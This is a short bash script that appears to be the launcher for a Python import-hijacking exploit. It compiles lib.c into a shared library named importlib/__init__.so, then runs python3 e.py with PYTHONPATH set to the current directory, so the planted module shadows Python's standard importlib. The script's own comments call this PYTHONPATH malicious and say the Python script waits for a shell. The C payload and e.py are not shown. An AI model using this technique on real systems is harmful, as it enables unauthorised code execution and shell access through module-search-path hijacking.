#!/bin/bash

set -e
mkdir -p "$PWD/importlib"

# Compile lib.c into the prepared PYTHONPATH
gcc -shared -fPIC -o "$PWD/importlib/__init__.so" lib.c

# Set the malicious PYTHONPATH and run a py script that waits for the shell
PYTHONPATH="$PWD" python3 e.py
